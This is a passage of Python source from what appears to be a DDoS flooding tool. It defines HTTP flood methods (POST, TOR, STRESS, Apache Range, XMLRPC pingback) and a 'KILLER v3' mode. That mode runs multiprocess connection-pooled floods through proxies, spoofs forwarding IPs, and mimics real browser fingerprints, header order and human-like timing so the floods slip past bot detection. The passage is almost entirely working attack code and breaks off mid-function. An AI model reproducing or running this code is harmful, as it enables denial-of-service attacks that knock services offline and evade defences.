                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
                'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/100.0.0.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/100.0.0.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/6.7',
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
                                                       target.raw_path_qs)
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        ip1: str = ProxyTools.Random.rand_ipv4()
        ip2: str = ProxyTools.Random.rand_ipv4()
        parts = []
        parts.append(f'X-Forwarded-For: {ip1}')
        if randchoice([True, False, False, False]):
            parts.append(f'Client-IP: {ip2}')
        if randchoice([True, False, False, False, False]):
            parts.append(f'Via: 1.1 {randchoice(["squid", "nginx", "cloudflare"])}')
        if randchoice([True, False, False, False, False, False]):
            parts.append(f'X-Real-IP: {ip2}')
        return "\r\n".join(parts) + "\r\n" if parts else ""

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        try:
            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        except Exception:
            pass
        try:
            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
        except Exception:
            pass
        try:
            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
        except Exception:
            pass
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with  suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        payload: Any = str.encode(self._defaultpayload +
                                  f"Host: {self._target.authority}\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    # ── KILLER v3: Browser fingerprint order templates ─────────────────────
    _KILLER_CHROME_ORDER = (
        "host", "connection", "sec-ch-ua", "sec-ch-ua-mobile",
        "sec-ch-ua-platform", "upgrade-insecure-requests", "user-agent",
        "accept", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
        "sec-fetch-dest", "accept-encoding", "accept-language", "cookie",
        "referer", "x-forwarded-for", "dnt", "cache-control", "pragma",
    )
    _KILLER_FIREFOX_ORDER = (
        "host", "user-agent", "accept", "accept-language",
        "accept-encoding", "connection", "cookie",
        "upgrade-insecure-requests", "sec-fetch-dest", "sec-fetch-mode",
        "sec-fetch-site", "sec-fetch-user", "dnt", "referer",
        "x-forwarded-for", "cache-control", "pragma",
    )
    _KILLER_SAFARI_ORDER = (
        "host", "accept", "sec-fetch-site", "cookie", "sec-fetch-dest",
        "sec-fetch-mode", "accept-language", "user-agent", "referer",
        "accept-encoding", "connection", "x-forwarded-for",
        "upgrade-insecure-requests", "cache-control",
    )
    _KILLER_EDGE_ORDER = (
        "host", "connection", "sec-ch-ua", "sec-ch-ua-mobile",
        "sec-ch-ua-platform", "upgrade-insecure-requests",
        "accept", "user-agent", "sec-fetch-site", "sec-fetch-mode",
        "sec-fetch-user", "sec-fetch-dest", "accept-encoding",
        "accept-language", "cookie", "referer", "x-forwarded-for",
        "dnt", "cache-control",
    )

    # ── KILLER v3: Browser fingerprints (UA → headers → order) ───────────
    _KILLER_FINGERPRINTS = (
        # Chrome 135 on Windows 10/11
        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         "order": _KILLER_CHROME_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
         "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8",
                       "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
                       "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                       "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                       "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                       "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
                       "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                       "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                       "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
                       "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
                       "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
                       "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7",
                       "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7"),
         "sec_ch_ua": '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="99"',
         "platform": '"Windows"',
         "device_memory": ("8", "16"),
         "viewport": ("1920x1080", "2560x1440", "1366x768", "1536x864"),
         "ect": ("4g", "3g"),
         "rtt": ("50", "100", "150"),
         "downlink": ("10", "5", "2.5"),
        },
        # Chrome 134 on macOS
        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
         "order": _KILLER_CHROME_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
                       "ja-JP,ja;q=0.9,en;q=0.8",
                       "fr-FR,fr;q=0.9,en;q=0.8",
                       "de-DE,de;q=0.9,en;q=0.8"),
         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="134", "Google Chrome";v="134"',
         "platform": '"macOS"',
         "device_memory": ("8", "16"),
         "viewport": ("2560x1600", "1440x900", "1680x1050"),
         "ect": ("4g", "3g"),
         "rtt": ("50", "100"),
         "downlink": ("10", "5"),
        },
        # Chrome 135 on Linux
        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         "order": _KILLER_CHROME_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
                       "pt-BR,pt;q=0.9,en;q=0.8"),
         "sec_ch_ua": '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="24"',
         "platform": '"Linux"',
         "device_memory": ("8", "16"),
         "viewport": ("1920x1080", "2560x1440"),
         "ect": ("4g", "3g"),
         "rtt": ("50", "100"),
         "downlink": ("10", "5"),
        },
        # Firefox 135 on Windows
        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
         "order": _KILLER_FIREFOX_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "languages": ("en-US,en;q=0.5", "en-US,en;q=0.9",
                       "de-DE,de;q=0.9,en-US;q=0.8",
                       "fr-FR,fr;q=0.9,en-US;q=0.8",
                       "es-ES,es;q=0.9,en;q=0.5",
                       "it-IT,it;q=0.9,en;q=0.5"),
         "sec_ch_ua": None, "platform": None,
         "device_memory": None, "viewport": None,
         "ect": None, "rtt": None, "downlink": None},
        # Firefox 134 on macOS
        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
         "order": _KILLER_FIREFOX_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "languages": ("en-US,en;q=0.5", "ja-JP,ja;q=0.7,en;q=0.3",
                       "fr-FR,fr;q=0.9,en;q=0.5"),
         "sec_ch_ua": None, "platform": None,
         "device_memory": None, "viewport": None,
         "ect": None, "rtt": None, "downlink": None},
        # Firefox 135 on Linux
        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
         "order": _KILLER_FIREFOX_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "languages": ("en-US,en;q=0.5", "en-GB,en;q=0.5",
                       "de-DE,de;q=0.9,en;q=0.5"),
         "sec_ch_ua": None, "platform": None,
         "device_memory": None, "viewport": None,
         "ect": None, "rtt": None, "downlink": None},
        # Safari 18.2 on macOS 15 Sequoia
        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
         "order": _KILLER_SAFARI_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
                       "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"),
         "sec_ch_ua": None, "platform": None,
         "device_memory": None, "viewport": None,
         "ect": None, "rtt": None, "downlink": None},
        # Safari 18.2 on iPhone
        {"ua_prefix": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
         "order": _KILLER_SAFARI_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8"),
         "sec_ch_ua": None, "platform": None,
         "device_memory": None, "viewport": None,
         "ect": None, "rtt": None, "downlink": None},
        # Edge 135 on Windows
        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
         "order": _KILLER_EDGE_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
         "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8"),
         "sec_ch_ua": '"Chromium";v="135", "Not?A_Brand";v="8", "Microsoft Edge";v="135"',
         "platform": '"Windows"',
         "device_memory": ("8", "16"),
         "viewport": ("1920x1080", "2560x1440"),
         "ect": ("4g", "3g"),
         "rtt": ("50", "100"),
         "downlink": ("10", "5"),
        },
        # Edge 134 on Windows (secondary)
        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
         "order": _KILLER_EDGE_ORDER,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
         "languages": ("en-US,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8"),
         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="134", "Microsoft Edge";v="134"',
         "platform": '"Windows"',
         "device_memory": ("8", "16"),
         "viewport": ("1920x1080", "1366x768"),
         "ect": ("4g", "3g"),
         "rtt": ("50", "100"),
         "downlink": ("10", "5"),
        },
    )

    # ── KILLER v3: Request pattern profiles (browser mimicry) ─────────────
    _KILLER_PROFILES = (
        ("PAGE_LOAD", (
            ("GET", "/"),
            ("GET", "/style.css"),
            ("GET", "/app.js"),
            ("GET", "/favicon.ico"),
        )),
        ("API_CALL", (
            ("GET", "/api/v1/data"),
            ("POST", "/api/v1/track"),
            ("GET", "/api/v1/user"),
        )),
        ("SEARCH", (
            ("GET", "/search?q={rand}"),
            ("GET", "/results"),
            ("GET", "/suggest?q={rand}"),
        )),
        ("MOBILE", (
            ("GET", "/"),
            ("POST", "/api/poll"),
            ("GET", "/manifest.json"),
        )),
        ("SPA_NAV", (
            ("GET", "/"),
            ("GET", "/assets/main.{rand}.js"),
            ("GET", "/assets/vendor.{rand}.js"),
            ("GET", "/api/v2/config"),
            ("GET", "/api/v2/user"),
        )),
        ("ECOMMERCE", (
            ("GET", "/"),
            ("GET", "/products?sort={rand}"),
            ("GET", "/product/{rand}"),
            ("POST", "/api/cart/add"),
            ("GET", "/cart"),
        )),
        ("NEWS_FEED", (
            ("GET", "/"),
            ("GET", "/api/feed?cursor={rand}"),
            ("GET", "/api/feed?cursor={rand}&limit=20"),
            ("GET", "/static/ads/banner.{rand}.jpg"),
        )),
        ("LOGIN_FLOW", (
            ("GET", "/login"),
            ("GET", "/static/css/auth.css"),
            ("GET", "/static/js/auth.bundle.js"),
            ("POST", "/api/auth/login"),
        )),
        ("RAW_FLOOD", None),
    )

    _KILLER_PATHS = (
        "/?page=%d", "/search?q=%s", "/api/v1/%s", "/static/%s",
        "/images/%s", "/assets/%s", "/data/%s", "/feed/%s",
        "/index.html?%s=%s", "/%s", "/%s/%s",
        "/css/%s", "/js/%s", "/fonts/%s", "/media/%s",
        "/downloads/%s", "/uploads/%s", "/content/%s",
        "/v2/%s", "/v3/%s", "/rest/%s", "/graphql",
        "/wp-admin/%s", "/wp-content/%s", "/wp-includes/%s",
        "/blog/%s", "/news/%s", "/articles/%s", "/posts/%s",
    )

    # ── KILLER v3: Random casing for non-critical headers ─────────────────
    _KILLER_CASABLE = frozenset((
        "accept", "accept-encoding", "accept-language", "connection",
        "cache-control", "dnt", "pragma", "sec-fetch-dest",
        "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
        "upgrade-insecure-requests", "sec-gpc", "priority",
        "sec-ch-ua-mobile", "sec-ch-ua-platform", "x-requested-with",
        "device-memory", "viewport-width", "ect", "rtt",
        "downlink", "purpose", "sec-purpose", "width",
        "sec-ch-ua-full-version-list", "sec-ch-ua-model",
        "save-data", "max-downlink", "downlink", "dpr",
    ))

    def KILLER(self) -> None:
        global REQUESTS_SENT, BYTES_SEND
        num_processes = max(1, min(cpu_count(), 8))
        rpc_per_process = max(self._rpc // num_processes, 1)
        workers_per_process = min(rpc_per_process * 8, 200)

        ua_data = list(self._useragents)
        ref_data = list(self._referers)
        proxy_data = []
        if self._proxies:
            for p in self._proxies:
                try:
                    proxy_data.append((p.type.value, p.host, p.port, p.username or "", p.password or ""))
                except Exception:
                    pass
        fp_data = list(self._KILLER_FINGERPRINTS)
        target_host = self._target.host
        target_port = self._target.port or (443 if self._target.scheme == "https" else 80)
        target_scheme = self._target.scheme
        target_authority = self._target.authority
        raw_target = self._raw_target
        is_https = self._target.scheme.lower() == "https"

        procs = []
        for _ in range(num_processes):
            p = Process(
                target=_killer_process_entry,
                args=(workers_per_process, rpc_per_process,
                      target_host, target_port, target_scheme,
                      target_authority, raw_target, is_https,
                      proxy_data, ua_data, ref_data, fp_data),
                daemon=True,
            )
            p.start()
            procs.append(p)
        for p in procs:
            p.join()

    def _killer_process_main(self, max_workers: int, rpc: int) -> None:
        from random import uniform, randint, choice as rc

        conn_pool = []
        pool_lock = Lock()
        active = True
        refill_backoff = 0.001

        def refill_pool():
            nonlocal refill_backoff
            while active:
                with pool_lock:
                    if len(conn_pool) >= max_workers:
                        refill_backoff = 0.001
                        break
                try:
                    s = self.open_connection()
                    with pool_lock:
                        conn_pool.append(s)
                    refill_backoff = 0.001
                except Exception:
                    sleep(min(refill_backoff, 0.5))
                    refill_backoff = min(refill_backoff * 2, 0.5)
                    continue

        def get_connection():
            with pool_lock:
                if conn_pool:
                    s = conn_pool.pop()
                    try:
                        s.setblocking(False)
                        s.recv(0, 0x400 | 0x40)  # MSG_PEEK | MSG_DONTWAIT
                        s.setblocking(True)
                        return s
                    except (BlockingIOError, OSError):
                        Tools.safe_close(s)
            try:
                return self.open_connection()
            except Exception:
                return None

        def return_connection(s):
            if s is None:
                return
            with pool_lock:
                if len(conn_pool) < max_workers:
                    conn_pool.append(s)
                    return
            Tools.safe_close(s)

        refill_pool()

        base_delay = max(0.0005, 1.0 / max(max_workers, 1))
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            while active:
                refill_pool()
                # ── Super Power: Variable burst sizes for traffic shaping ──
                burst_type = rc(("normal", "burst", "sustained", "wave"))
                if burst_type == "normal":
                    burst = max(max_workers // 4, 10)
                elif burst_type == "burst":
                    burst = max(max_workers // 2, 20)
                elif burst_type == "sustained":
                    burst = max(max_workers // 3, 15)
                else:
                    burst = max(max_workers // 6, 8)

                for _ in range(burst):
                    pool.submit(self._killer_worker_v3,
                                get_connection, return_connection, rpc)

                if burst_type == "burst":
                    sleep(base_delay * uniform(0.1, 0.4))
                elif burst_type == "sustained":
                    sleep(base_delay * uniform(0.3, 0.8))
                elif burst_type == "wave":
                    sleep(base_delay * uniform(2.0, 5.0))
                else:
                    sleep(base_delay * uniform(0.3, 1.0))

                # ── Follow-up micro-burst ─────────────────────────────
                for _ in range(max(burst // 3, 5)):
                    pool.submit(self._killer_worker_v3,
                                get_connection, return_connection, rpc)

                if burst_type == "wave":
                    sleep(base_delay * uniform(0.5, 1.0))
                else:
                    sleep(base_delay * uniform(1.5, 4.0))

    def _killer_worker_v3(self, get_conn, return_conn, rpc: int) -> None:
        from random import uniform, choice as rc, randint

        fp = rc(self._KILLER_FINGERPRINTS)
        profile_name, profile_steps = rc(self._KILLER_PROFILES)

        s = get_conn()
        if s is None:
            return

        try:
            if profile_steps and profile_name != "RAW_FLOOD":
                for i, (method, path) in enumerate(profile_steps):
                    path = path.replace("{rand}",
                                        ProxyTools.Random.rand_str(8))
                    payload = self._killer_build_request(method, path, fp)
                    if not Tools.send(s, payload):
                        break
                    # ── Super Power: Human-like timing between requests ──
                    if i == 0:
                        sleep(uniform(0.05, 0.2))
                    elif i == 1:
                        sleep(uniform(0.01, 0.06))
                    elif i == 2:
                        sleep(uniform(0.005, 0.04))
                    else:
                        sleep(uniform(0.003, 0.02))
            else:
                batch = min(rpc, randint(5, 15))
                for _ in range(batch):
                    payload = self._killer_payload_v3(fp)
                    if not Tools.send(s, payload):
                        break
                    # ── Super Power: Variable inter-request timing ──────
                    if rc([True, False, False]):
                        sleep(uniform(0.0005, 0.003))
                    elif rc([True, False]):
                        sleep(uniform(0.0001, 0.001))
                    else:
                        sleep(uniform(0.0005, 0.005))

            return_conn(s)
        except Exception:
            Tools.safe_close(s)

    def _killer_build_request(self, method: str, path: str, fp: dict) -> bytes:
        from random import randint, choice as rc, uniform

        headers = {}
        headers["host"] = self._target.authority
        headers["user-agent"] = fp.get("ua_prefix", rc(self._useragents))

        if fp.get("sec_ch_ua"):
            headers["sec-ch-ua"] = fp["sec_ch_ua"]
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = fp["platform"]
        elif rc([True, False, False, False, False]):
            headers["sec-ch-ua"] = rc((
                '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="99"',
                '"Not?A_Brand";v="8", "Chromium";v="135", "Google Chrome";v="135"',
                '"Google Chrome";v="135", "Chromium";v="135", "Not?A_Brand";v="24"',
            ))
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = rc(('"Windows"', '"macOS"', '"Linux"'))

        headers["accept"] = fp["accept"]
        headers["accept-language"] = rc(fp["languages"])
        headers["accept-encoding"] = rc((
            "gzip, deflate, br, zstd",
            "gzip, deflate, br",
            "gzip, deflate",
            "gzip, deflate, br, zstd, compression",
        ))
        headers["x-forwarded-for"] = ProxyTools.Random.rand_ipv4()

        if method == "POST":
            rand_data = ProxyTools.Random.rand_str(randint(16, 128))
            headers["content-type"] = rc((
                "application/x-www-form-urlencoded",
                "application/json"))
            headers["content-length"] = str(len(rand_data) + 5)

        if rc([True, False]):
            headers["connection"] = "keep-alive"
        if rc([True, False]):
            headers["dnt"] = "1"
        if rc([True, True, False]):
            headers["cache-control"] = rc((
                "no-cache",
                "no-store, must-revalidate",
                "max-age=0",
            ))

        cookie = self._killer_rand_cookie()
        if cookie:
            headers["cookie"] = cookie

        if rc([True, False]):
            headers["sec-fetch-dest"] = rc((
                "document", "empty", "script",
                "style", "image", "font", "manifest",
            ))
            headers["sec-fetch-mode"] = rc((
                "navigate", "cors", "same-origin",
                "no-cors",
            ))
            headers["sec-fetch-site"] = rc((
                "none", "same-origin", "cross-site",
                "same-site",
            ))
            headers["sec-fetch-user"] = "?1"

        if rc([True, False]):
            headers["upgrade-insecure-requests"] = "1"

        if rc([True, False]):
            headers["sec-gpc"] = "1"

        if rc([True, False]):
            headers["pragma"] = "no-cache"

        if rc([True, False, False, False]):
            ref = rc(self._referers)
            headers["referer"] = "%s%s" % (ref, parse.quote(self._target.human_repr()))

        # ── Super Power: Network Information API headers ──────────────
        if fp.get("device_memory") and rc([True, False, False, False, False]):
            headers["device-memory"] = rc(fp["device_memory"])
        if fp.get("viewport") and rc([True, False, False, False, False, False]):
            vp = fp["viewport"].split("x")
            headers["viewport-width"] = vp[0]
            if rc([True, False]):
                headers["width"] = rc(("1920", "2560", "1366", "1536"))
        if fp.get("ect") and rc([True, False, False, False, False, False, False]):
            headers["ect"] = rc(fp["ect"])
            headers["rtt"] = rc(fp["rtt"])
            headers["downlink"] = rc(fp["downlink"])

        # ── Super Power: Hints & Priorities ───────────────────────────
        if rc([True, False, False, False, False, False, False, False]):
            headers["purpose"] = rc(("prefetch", "prefetch"))
        if rc([True, False, False, False, False, False, False, False, False]):
            headers["sec-purpose"] = "prefetch"
        if rc([True, False, False, False, False, False, False, False, False]):
            headers["priority"] = rc(("u=0, i", "u=1, i", "u=0", "high", "low"))
        if rc([True, False, False, False, False, False, False, False, False, False]):
            headers["save-data"] = "on"
        if rc([True, False, False, False, False, False, False, False, False, False, False]):
            headers["dpr"] = rc(("1", "2", "3"))
        if rc([True, False, False, False, False, False, False, False, False, False, False, False]):
            headers["max-downlink"] = rc(("10240", "5120", "2048"))

        # ── Super Power: Conditional request hints ────────────────────
        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            import time as _t
            etag = '"%s"' % ProxyTools.Random.rand_str(16)
            headers["if-none-match"] = etag
        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            import time as _t
            past = int(_t.time()) - randint(60, 86400)
            from email.utils import formatdate
            headers["if-modified-since"] = formatdate(timeval=past, usegmt=True)

        # ── Super Power: X-Requested-With for AJAX simulation ────────
        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            headers["x-requested-with"] = "XMLHttpRequest"

        order = fp["order"]
        ordered = []
        for key in order:
            if key in headers:
